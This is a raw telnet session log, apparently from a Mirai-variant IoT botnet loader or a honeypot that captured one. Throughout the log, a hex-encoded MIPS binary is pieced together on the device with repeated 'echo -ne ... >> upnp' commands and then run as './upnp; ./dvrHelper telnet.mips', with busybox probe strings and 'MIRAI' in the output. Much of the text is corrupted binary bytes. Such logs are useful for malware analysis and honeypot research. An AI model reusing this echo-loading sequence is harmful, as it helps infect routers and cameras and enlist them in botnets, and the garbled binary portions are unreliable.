+echooooo TELIN: x2e\x72\x
+echooooo TELIN: 6f\x6
+echooooo TELIN: 4\x61
+echooooo TELIN: \x74\
+echooooo TELIN: x61\x00
+echooooo TELIN: \x2e\x67\x6f\x7
+echooooo TELIN: 4\x00\
+echooooo TELIN: x2e\x62\x73 \x73
+echooooo TELIN: \x00\
+echooooo TELIN: x2e\
+echooooo TELIN: x6d\
+echooooo TELIN: x64\x
+echooooo TELIN: 65\x
+echooooo TELIN: 62\x7
+echooooo TELIN: 5\
+echooooo TELIN: x67\
+echooooo TELIN: x2e\
+echooooo TELIN: x61
+echooooo TELIN: \x62\x6
+echooooo TELIN: 9\x3
+echooooo TELIN: 3\x32
+echooooo TELIN: \x00
+echooooo TELIN: \x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00
+echooooo TELIN: \x00 \
+echooooo TELIN: x00\x00\x00\x00\x00\x00\x00\x00\
+echooooo TELIN: x00\x00\x0
+echooooo TELIN: 0\
+echooooo TELIN: x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00 \x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0 \x00\x
+echooooo TELIN: 00\x0b
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\x00\x0
+echooooo TELIN: 1\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\
+echooooo TELIN: x06
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 40\
+echooooo TELIN: x00
+echooooo TELIN: \xa
+echooooo TELIN: 0\x
+echooooo TELIN: 00\
+echooooo TELIN: x00
+echooooo TELIN: \x0
+echooooo TELIN: 0\xa0
+echooooo TELIN: \x00 
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 05\x40
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x00\x
+echooooo TELIN: 00\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00' 
+echooooo TELIN: >> u
+echooooo TELIN: pnp
+echooooo TELIN: ; /bi
+echooooo TELIN: n/busyb
+echooooo TELIN: ox 
+echooooo TELIN: ECCHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 30 5c 78  echo -ne '\x00\x
+  0010  30 30 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  00\x00\x10\x00\x
+  0020  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0030  30 30 5c 78 30 30 5c 78 31 31 5c 78 30 30 5c 78  00\x00\x11\x00\x
+  0040  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  0050  30 30 5c 78 30 30 5c 78 33 32 5c 78 30 30 5c 78  00\x00\x32\x00\x
+  0060  34 30 5c 78 30 35 5c 78 65 30 5c 78 30 30 5c 78  40\x05\xe0\x00\x
+  0070  30 30 5c 78 30 35 5c 78 65 30 5c 78 30 30 5c 78  00\x05\xe0\x00\x
+  0080  30 30 5c 78 30 30 5c 78 35 30 5c 78 30 30 5c 78  00\x00\x50\x00\x
+  0090  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00a0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00b0  30 30 5c 78 30 30 5c 78 30 34 5c 78 30 30 5c 78  00\x00\x04\x00\x
+  00c0  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  00d0  30 30 5c 78 30 30 5c 78 31 39 5c 78 30 30 5c 78  00\x00\x19\x00\x
+  00e0  30 30 5c 78 30 30 5c 78 30 31 5c 78 31 30 5c 78  00\x00\x01\x10\x
+  00f0  30 30 5c 78 30 30 5c 78 30 33 5c 78 30 30 5c 78  00\x00\x03\x00\x
+  0100  34 34 5c 78 30 36 5c 78 33 30 5c 78 30 30 5c 78  44\x06\x30\x00\x
+  0110  30 30 5c 78 30 36 5c 78 33 30 5c 78 30 30 5c 78  00\x06\x30\x00\x
+  0120  30 30 5c 78 30 30 5c 78 35 34 5c 78 30 30 5c 78  00\x00\x54\x00\x
+  0130  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0140  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0150  30 30 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  00\x00\x10\x00\x
+  0160  30 30 5c 78 30 30 5c 78 30 34 5c 78 30 30 5c 78  00\x00\x04\x00\x
+  0170  30 30 5c 78 30 30 5c 78 31 65 5c 78 30 30 5c 78  00\x00\x1e\x00\x
+  0180  30 30 5c 78 30 30 5c 78 30 38 5c 78 30 30 5c 78  00\x00\x08\x00\x
+  0190  30 30 5c 78 30 30 5c 78 30 33 5c 78 30 30 5c 78  00\x00\x03\x00\x
+  01a0  34 34 5c 78 30 36 5c 78 39 30 5c 78 30 30 5c 78  44\x06\x90\x00\x
+  01b0  30 30 5c 78 30 36 5c 78 38 34 5c 78 30 30 5c 78  00\x06\x84\x00\x
+  01c0  30 30 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  00\x00\x10\x00\x
+  01d0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  01e0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  01f0  30 30 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  00\x00\x10\x00\x
+  0200  30 30 5c 78 30 30 5c 78 30 30 27 20 3e 3e 20 75  00\x00\x00' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00 \x00\x00\x32\x00\x40
+echooooo TELIN: \x05\xe0\
+echooooo TELIN: x00\x00\x05\
+echooooo TELIN: xe0\
+echooooo TELIN: x00\x00
+echooooo TELIN: \x00\x
+echooooo TELIN: 50\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\
+echooooo TELIN: x00 \x0
+echooooo TELIN: 0\x00\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\
+echooooo TELIN: x00\
+echooooo TELIN: x04
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\
+echooooo TELIN: x01\
+echooooo TELIN: x00\x00\x00\x1
+echooooo TELIN: 9\x00\
+echooooo TELIN: x00
+echooooo TELIN: \x00
+echooooo TELIN: \x01\
+echooooo TELIN: x10 \x
+echooooo TELIN: 00\x00\x03\x00\x44
+echooooo TELIN: \x06\x30
+echooooo TELIN: \x0
+echooooo TELIN: 0\x00\x06\x30\x00
+echooooo TELIN: \x0
+echooooo TELIN: 0\x00\x54\
+echooooo TELIN: x00\
+echooooo TELIN: x00\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0 \x00\x00\x00\x00\x00\x00\x10\x00\x00\x0
+echooooo TELIN: 0\x04\x
+echooooo TELIN: 00\x00\x00
+echooooo TELIN: \x1e
+echooooo TELIN: \x00
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\x08\
+echooooo TELIN: x00 \x00\x00\x03\x00
+echooooo TELIN: \x44\
+echooooo TELIN: x06\
+echooooo TELIN: x90\x00
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 06\x84\
+echooooo TELIN: x00\x00
+echooooo TELIN: \x00\x1
+echooooo TELIN: 0\x00\x0
+echooooo TELIN: 0\x00
+echooooo TELIN: \x00\x0
+echooooo TELIN: 0 \x
+echooooo TELIN: 00\
+echooooo TELIN: x00
+echooooo TELIN: \x00\x00\x0
+echooooo TELIN: 0\x00\
+echooooo TELIN: x10\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00'
+echooooo TELIN:  >>
+echooooo TELIN:  upn
+echooooo TELIN: p; 
+echooooo TELIN: /bi
+echooooo TELIN: n/busybox 
+echooooo TELIN: ECCH
+echooooo TELIN: I
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 30 5c 78  echo -ne '\x00\x
+  0010  30 30 5c 78 30 30 5c 78 32 33 5c 78 30 30 5c 78  00\x00\x23\x00\x
+  0020  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  0030  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0040  30 30 5c 78 30 30 5c 78 34 38 5c 78 30 30 5c 78  00\x00\x48\x00\x
+  0050  30 30 5c 78 30 36 5c 78 38 34 5c 78 30 30 5c 78  00\x06\x84\x00\x
+  0060  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0070  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0080  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0090  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  00a0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00b0  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  00c0  30 30 5c 78 30 30 5c 78 30 33 5c 78 30 30 5c 78  00\x00\x03\x00\x
+  00d0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00e0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00f0  30 30 5c 78 30 36 5c 78 38 34 5c 78 30 30 5c 78  00\x06\x84\x00\x
+  0100  30 30 5c 78 30 30 5c 78 33 31 5c 78 30 30 5c 78  00\x00\x31\x00\x
+  0110  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0120  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0130  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  0140  30 30 5c 78 30 30 5c 78 30 30 27 20 3e 3e 20 75  00\x00\x00' >> u
+  0150  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0160  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00 \x00\x06\x84\x00\x00
+echooooo TELIN: \x00\
+echooooo TELIN: x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\x00\x00\x
+echooooo TELIN: 00\x00\x0
+echooooo TELIN: 0\x00\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\
+echooooo TELIN: x01
+echooooo TELIN: \x00 \x00\x0
+echooooo TELIN: 0\x00\x00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 1\x0
+echooooo TELIN: 0\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x03
+echooooo TELIN: \x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\x
+echooooo TELIN: 0
+echooooo TELIN: 0\x00 \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 06\x84\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\
+echooooo TELIN: x31\x00\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x00\
+echooooo TELIN: x00\x00\
+echooooo TELIN: x00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x01\x00 
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00' 
+echooooo TELIN: >> u
+echooooo TELIN: pnp;
+echooooo TELIN:  /bi
+echooooo TELIN: n/busy
+echooooo TELIN: box 
+echooooo TELIN: ECCH
+echooooo TELIN: I
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+# 
+echooooo [FD13] Finished echo loading!
+TELOUT:
+  0000  2e 2f 75 70 6e 70 3b 20 2e 2f 64 76 72 48 65 6c  ./upnp; ./dvrHel
+  0010  70 65 72 20 74 65 6c 6e 65 74 2e 6d 69 70 73 3b  per telnet.mips;
+  0020  20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 49 48   /bin/busybox IH
+  0030  43 43 45 0d 0a                                   CCE..
+TELIN: .
+TELIN: /upnp; ./dvrHelper telnet.mips; /bin/busybox IHCCE
+MIRAI
+NIF
+
+TELIN: dvrHelper
+TELIN: : applet not found
+
+TELIN: IHCCE
+TELIN: : applet not found
+
+
+# ./upnp; ./dvrHelper telnet.mips; /bin/busybox IHCCE
+MIRAI
+NIF
+dvrHelper: applet not found
+IHCCE: applet not found
+0\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x06\x84\x00\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00' >> upnp; /bin/busybox ECCHI
+ECCHI: applet not found
+# 00\x08\x00 \x00\x00\x03\x00\x44\x06\x90\x00\x00\x06\x84\x00\x00\x00\x10\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00' >> upnp; /bin/busybox ECCHI
+ECCHI: applet not found
+0\x18\xaf\xbc\x00\x10\x8f\x99\x80\x34\x00 \x00\x00\x00\x03\x20\xf8\x09\x00\x80\x80\x21\x8f\xbc\x00\x10\xac\x50\x00\x00\x8f \xbf\x00\x1c\x8f\xb0\x00\x18\x24\x02\xff\xff\x03\xe0\x00\x08\x27\xbd\x00\x20\x00 \x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x60\x03\x99\xe0\x21\x8f \x82\x80\x30\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6d \x69\x70\x73\x00\x00\x00\x00\x4d\x49\x52\x41\x49\x0a\x00\x00\x64\x76\x72\x48\x65 \x6c\x70\x65\x72\x00\x00\x00\x4e\x49\x46\x0a' >> upnp; /bin/busybox ECCHI
+ECCHI: applet not found
+Bæ @÷H Bæ€ Bæp Bæ` @ßì     @H  BæP Ah Ağ Bæ@ Bæ0 @ğ0 Bæ  BÅ€ ¨ Bæ BF\ A7¼ BÑ€ Bæ  Båğ Båà BåĞ 0 @˜@ BåÀ ğ Bå° B» Bå  Bå @Cp Bå€ ˆ Bx Båp Bå` BåP Bå@     Bå0 Bå  @F¤ B‰  Bå BŠ´ @ìÄ Bå  BÍà     Bäğ AP Bäà B«€ BäĞ     @`¤ BäÀ ¤ @Ã` BÁ  B` @¹ @kà B§  A#ğ Bä° @¸  ¬ @kğ Bä  BÂ` Bä Bªğ Bä€ Bäp BJˆ     @•¬ BÌ@ A)¤ Bä` B8T BäP   Aj CgĞ Bä@ BˆÀ Bä0 Bä  A[È @×€ Bç` Bä AUÀ B¸ Bä  Bãğ Bãà BãĞ BÅ° BãÀ Bã° BÄ€ Bã  BÉ0 Bã A'0 Bã€ Aà BÍ  @‡à Bãp B¦ğ Bã` BãP B½p Bã@ Bˆ0 Bã0 Bã  B¯ BËà ü Bã Bã  Bâğ ô ô œ B¬0 @?Ğ A2h Bâà BâĞ BâÀ Bâ° BĞğ Bâ  @‡€     B¦p Bâ Bâ€ Bâp Bw Bâ` BâP @¾  Bâ@ Bâ0 Bâ  Bâ Bâ  BË A) @€  Báğ à @ÆĞ Báà BáĞ A˜ B” AsĞ BáÀ B±  ø B‰€ AG Bá° Bá  @Àà Bá Bá€ Báp Bá` BáP Bá@ ø Bá0   Bá  @é € @‰@ Bá Bá  Bàğ A=h Bàà BàĞ „ ì     B¯Ğ Bµ°     BàÀ ğ Bà° Bà          BËp Bà à     A?, Bà€ AHH Bàp @ñ@ Bà`  BàP Bà@     Bà0 Bà  @@d Bà ğ Bà  B¼à Bßğ Bßà @C( BßĞ BßÀ Bß° Bß  Bß     Ğ Bß€ @ñ¬ Bßp Bv\ Bß` B BßP BĞ Bw@ Bß@ Bß0 B§ğ Bß  B½ Bß Bß  @=¬ BÍP BŞğ Bé@ AJ  Cc  Ğ BÉ  A˜ BŞà BŞĞ B‚0 BŞÀ Bƒ€ BŞ° Br BŞ  A!ˆ BŞ @¹° BŞ€ BŞp @V` BŞ` AH @„ğ @S BŞP B†€ @BP BŞ@ A?Ğ BÃ  @Ï BŞ0 @ ü BŞ  B¤ü BŞ  BŞ  Bİğ Bİà BP BİĞ AIx BİÀ AK` Bİ° BÏ0 AED Bİ  C^  Bİ BÍÀ Bİ€ Bİp     Bİ` BİP B¾ğ Bİ@ BBl Bİ0 AXÀ B‚ğ Bİ  Bİ @ğÜ Bİ  BÜğ BÜà A,( BÜĞ BÜÀ B… BÜ° BÁ° AAô BÊ  BÜ  Bgd 0 g` @Dğ A%Ü BÜ AT@ BÜ€ BÜp Bv€ BaÀ BÜ` BÜP BÜ@ BÜ0 BÜ  @ğ¨ A´ BÜ AE  BÜ  BÛğ BÛà @†  ä BÛĞ è BÛÀ AF  BÃ@ B„ BN„ BÛ° BYà BÎà     BÎ      BéD BÛ  BÛ BMÀ @± BÛ€ BÉĞ @˜0 BÛp BÛ` BÛP BÛ@ A¸ Bu° BÊP BÛ0 BÛ  BÛ BÛ  BÍp A   € Bª BÚğ BÚà B°  @û” A< Aì BÚĞ BwĞ BÏ     BÚÀ BÚ° BÚ  4 A Ø @õp BÚ BÑ@ BĞ BÚ€ BÚp BÓ  BÚ` AP€ A=¼ @âÜ A/4 @Ä„ @ğ„ @Ià Aì AĞ BÚP BÚ@ BÊ° BÚ0 BÚ # /bin/busybox ECCHI
+ECCHI: applet not found
+# CgT Cgl Cg Cg  Cg¼ Cğ @•¬0    Cô @@d    Cü @Dğ    C  @F¤    C @H     C @Ià    C @S    C BaÀ    C  @V`    C( @`¤0    C0 @kà    C8 @Ã`0    C@ Aj0    CH @Ä„    CT @ÆĞ     C` @±     Ch @¾      Cp AP€    Cx AP€0    C€ BBl     Cˆ @±     C @kğ    C” BF\0    Cœ BJˆ     C¤ @€     C¨ @„ğ    C° @†     C¸ Bgd    CÀ B    CÄ @Ï0    CĞ AT@    CØ @×€    Cà AUÀ    Cä @‡€    Cè @¸      Cğ @‡à    Cô @Àà     Cü @âÜ     C @ìÄ    C B    C @‰@    C @¹°    C  BYà     C( @•¬0    C0 AĞ0    C8 Ah    C@ A[È0    CD @˜0    CL @˜@0    CP Br    CX @é                                                              0            /dev/console                       ÿÿÿÿÿÿÿÿ    ÿÿÿÿ            i               C6ğ C2¤ C2´ C7  C2ì C3 C3 C3, C;È C;Ğ C;Ü C;è C;ô C<  C< C<  C<, C<4 C<@ C<P C<\ C<h C<t C<€ C<Œ C<˜ C<¤ C<´ C<À C<Ô C<è C<ü C= C=$ C=8 C=L C=` C=p C;L C=€ C= C=             w0–îa,™        QºmÄpjôéc¥5d•£Ûˆ2yÜ¸¤àÕé—ÒÙˆ  ¶L+~±|½ç¸-¿‘·dj° òó¹qH„¾AŞÚÔ}mİäëôÔµQƒÓ…Çl˜Vdk¨ÀıbùzŠeÉì\OclÙú=cõ;n ÈLi^Õ`Aä¢gqr<äÑKÔGÒ…ı¥
+µk5µ¨úB²˜lÛ»ÉÖ¬¼ù@2ØlãEß\uÜÖÏ«Ñ=Y&Ù0¬QŞ :È×Q€¿Ğa!´ôµV³Ä#Ïº•™¸½¥(¸_ˆÆÙ²±é$/o|‡XhLÁa«¶f-=vÜAÛq˜Ò ¼ïÕ*q±…‰¶µŸ¿ä¥è¸Ô3xÉ¢ ù4–     ¨á˜j»m=-‘dl—æc\kkQôlab…e0Øòb Nl•í¥{‚ôÁõÄWe°ÙÆ·éP‹¾¸êü¹ˆ|bİßÚ-IŒÓ|óûÔLeM²aX:µQÎ£¼ tÔ»0âJß¥A=Ø•×¤ÑÄmÓÖôûCiéj4nÙü­gˆFÚ`¸ĞD-s3åª
+L_İ|ÉPq<'Aª¾É †Whµ% o…³¹fÔ ÎaäŸ^Şù)ÙÉ˜°Ğ˜"Ç×¨´Y³=.´·½\;Àºl­í¸ƒ š¿³¶¶ât±ÒšêÕG9Òw¯Û&sÜƒãc”d;„mj>zjZ¨äÏ“      ÿ
+ ®'}±ğ“D‡£ÒòhiÂş÷bW]€egËl6qnkçşÔv‰Ó+àÚzZgİJÌù¹ßo¾ïù·¾C`°ÕÖÖ£è¡Ñ“~8ØÂÄOßòRÑ»gñ¦¼Wg?µİH²6KØ+Ú¯
+L6JöAz`ß`ïÃ¨gßU1nïFi¾yËa³Œ¼fƒ%oÒ Rhâ6Ìw•»G"¹U&/Åº;¾²½(+´Z’\³jÂ×ÿ§µĞÏ1,Ù‹[Ş®›dÂ°ìcò&uj£œm“
+œ       ©ë6?rg… W•¿J‚â¸z{±+®¶8’Ò›åÕ¾|Üï·Ûß!†ÓÒÔñÔâBhİ³øÚƒn¾Íö¹&[o°wá·GwˆZæÿjpf;Ê\eÿøb®iakÿÓlÏE 
+âx×ÒîNƒT9³Â§g&aĞ`÷IiGM>nwÛ®ÑjJÙÖZÜ@ßf7Ø;ğ©¼®SŞ»ÅG²Ï0µÿé½½òÊºÂŠS³“0$´£¦ºĞ6Í×“TŞW)#Ùg¿³fz.ÄaJ¸]h*o+”´¾7Ã¡Zß-ï               ÿÿÿÿ        ÿÿÿÿ[?*    ÿÿÿÿ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ÿÿÿÿ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         CLì CLø CM  CM CM CM CM CM$ CM, CM0 CM8 CM< CMD CML CMT CM\ CMd CMl E N„ Nt       
+     M7 CŒ M; CMt   CMx       CM€  
+ CMˆ   CM   CM”   CMœ   C#|   CM    CM¨   CM°   CM¸   CMÀ   CMÄ   CMÈ   CMÌ   CMĞ   { CMÔ   } CE            CNX CNd     CNl CNt CNˆ CN˜ CN  CN¬ CNÈ CNĞ CNØ CNà     CNè CNô       P             CŒ CŒ        ÿÿÿÿÿÿÿÿ           ÿÿ       ÿÿÿÿÿÿÿÿ  @     ÿÿÿÿÿÿÿÿ                  ÿÿ   ÿÿÿÿ                     CV     CV$   P CV0   H CT     C<X   X CV8     CV@   0 CVD    C;à   À CVL   8 CVT     CV`   ( C34    CVh   @ CVp   € CVx   ˆ CV€    CVˆ   ˜ CV     CV˜   ¨ CV    ° CV¨   ¸    ÿÿÿÿ CV°    CV¸    CVÀ    CVÈ     CVĞ    C7    C:|    CVÔ    CVÜ    CVä     CVì    CVô       ÿÿÿÿ CVü            ÿÿÿÿÿÿÿÿ         P      C^0 C^8         Bä Bh                             C0d C^@           B@                    ÿÿÿÿ     C^P C^t C^˜  ä Ä ¤     C^0 C^8ÿÿÿÿ     Bä             C_ˆ C_Œ                        C*` C_¤       BD             C_° C_¸                                   CfÀ                                               €       @   C   A   B               Bç@ Bç0 Bç  @ûH e° Bç Bç  B¬À Bæğ   A=P Bæà BæĞ     BæÀ Bæ° Bæ  B< BÆ  BÌÀ Bæ @÷H Bæ€ Bæp Bæ` @ßì     @H  BæP Ah Ağ Bæ@ Bæ0 @ğ0 Bæ  BÅ€ ¨ Bæ BF\ A7¼ BÑ€ Bæ  Båğ Båà BåĞ 0 @˜@ BåÀ ğ Bå° B» Bå  Bå @Cp Bå€ ˆ Bx Båp Bå` BåP Bå@     Bå0 Bå  @F¤ B‰  Bå BŠ´ @ìÄ Bå  BÍà     Bäğ AP Bäà B«€ BäĞ     @`¤ BäÀ ¤ @Ã` BÁ  B` @¹ @kà B§  A#ğ Bä° @¸  ¬ @kğ Bä  BÂ` Bä Bªğ Bä€ Bäp BJˆ     @•¬ BÌ@ A)¤ Bä` B8T BäP   Aj CgĞ Bä@ BˆÀ Bä0 Bä  A[È @×€ Bç` Bä AUÀ B¸ Bä  Bãğ Bãà BãĞ BÅ° BãÀ Bã° BÄ€ Bã  BÉ0 Bã A'0 Bã€ Aà BÍ  @‡à Bãp B¦ğ Bã` BãP B½p Bã@ Bˆ0 Bã0 Bã  B¯ BËà ü Bã Bã  Bâğ ô ô œ B¬0 @?Ğ A2h Bâà BâĞ BâÀ Bâ° BĞğ Bâ  @‡€     B¦p Bâ Bâ€ Bâp Bw Bâ` BâP @¾  Bâ@ Bâ0 Bâ  Bâ Bâ  BË A) @€  Báğ à @ÆĞ Báà BáĞ A˜ B” AsĞ BáÀ B±  ø B‰€ AG Bá° Bá  @Àà Bá Bá€ Báp Bá` BáP Bá@ ø Bá0   Bá  @é € @‰@ Bá Bá  Bàğ A=h Bàà BàĞ „ ì     B¯Ğ Bµ°     BàÀ ğ Bà° Bà          BËp Bà à     A?, Bà€ AHH Bàp @ñ@ Bà`  BàP Bà@     Bà0 Bà  @@d Bà [FD13] Failed to execute payload
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0010  48 49 0d 0a                                      HI..
+TELIN: # 
+TELIN: /bin/busybox ECCHI
+ECCHI: applet not found
+# 
+[FD13] Shut down connection
+[FD13] Cleaned up files
